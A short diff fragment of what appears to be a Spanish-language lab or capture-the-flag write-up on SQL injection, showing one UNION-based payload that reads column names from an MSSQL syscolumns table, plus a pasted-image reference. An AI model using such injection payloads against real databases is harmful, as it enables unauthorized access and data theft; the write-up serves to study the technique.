@@ -204,3 +204,4 @@ de esta manera usando la query hemos logrado enumerar el nombre de las tablas en
 10' union select 1,name,3,4,5,6 FROM syscolumns WHERE id = 901578250-- -
 ```
 ![[Pasted image 20240519141705.png]]
+
